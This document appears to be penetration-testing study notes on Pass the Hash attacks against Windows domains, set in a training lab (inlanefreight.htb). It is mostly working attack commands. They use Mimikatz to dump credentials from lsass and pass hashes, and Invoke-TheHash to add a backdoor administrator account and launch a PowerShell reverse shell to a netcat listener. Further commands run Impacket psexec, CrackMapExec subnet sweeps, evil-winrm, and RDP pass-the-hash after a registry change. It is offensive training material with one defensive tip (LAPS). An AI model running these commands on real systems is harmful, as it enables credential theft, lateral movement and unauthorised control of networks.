# Pass the Hash (PtH)
A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.

    Dumping the local SAM database from a compromised host.
    Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
    Pulling the hashes from memory (lsass.exe).


## Pass the Hash from Windows Using Mimikatz:

```
> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\tmp\mimikatz_output.txt` 

> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe" exit
```

Now we can use cmd.exe to execute commands in the user's context. For this example, julio can connect to a shared folder named julio on the DC.

```
> dir \\dc01\julio
```

## Pass the Hash with PowerShell Invoke-TheHash (Windows) [https://github.com/Kevin-Robertson/Invoke-TheHash]
- Target - Hostname or IP address of the target.
- Username - Username to use for authentication.
- Domain - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
- Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
- Command - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash- have access to WMI on the target.

The following command will use the SMB method for command execution to create a new user named mark and add the user to the Administrators group.

### Invoke-TheHash with SMB
```
PS > Import-Module .\Invoke-TheHash.psd1
PS > Invoke-SMBExec -Target 10.129.186.240 -Domain inlanefreight.htb -Username david -Hash c39f2beb3d2ec06a62cb887fb391dee0 -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

To get a reverse shell, we need to start our listener using Netcat on our Windows machine, which has the IP address 172.16.1.5. We will use port 8001 to wait for the connection.

#### Netcat Listener
```
c:\htb> .\nc.exe -lvnp 8001
```

Now we can execute Invoke-TheHash to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is 172.16.1.10, we will use the machine name DC01 (either would work).

```
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "powershell -e "
```

## Pass the Hash with Impacket (Linux)
### Pass the Hash with Impacket PsExec
```
$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:
- impacket-wmiexec [https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py]
- impacket-atexec [https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py]
- impacket-smbexec [https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py]

## Pass the Hash with CrackMapExec (Linux)
```
# crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```
If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add --local-auth to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see Pwn3d!, it means that the user is a local administrator on the target computer. We can use the option -x to execute commands. It is common to see password reuse against many hosts in the same subnet. Organizations will often use gold images with the same local admin password or set this password the same across multiple hosts for ease of administration. If we run into this issue on a real-world engagement, a great recommendation for the customer is to implement the Local Administrator Password Solution (LAPS), which randomizes the local administrator password and can be configured to have it rotate on a fixed interval.



### CrackMapExec - Command Execution
```
# crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

## Pass the Hash with evil-winrm (Linux)
### Pass the Hash with evil-winrm
```
# evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

## Pass the Hash with RDP (Linux)
There are a few caveats to this attack:

    Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:

This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa with the value of 0. It can be done using the following command:

### Enable Restricted Admin Mode to Allow PtH
```
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access:

### Pass the Hash Using RDP
```
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

## UAC Limits Pass the Hash for Local Accounts
UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.

Note: There is one exception, if the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.

These settings are only for local administrative accounts. If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer. If you want to learn more about LocalAccountTokenFilterPolicy, you can read Will Schroeder's blog post Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy.
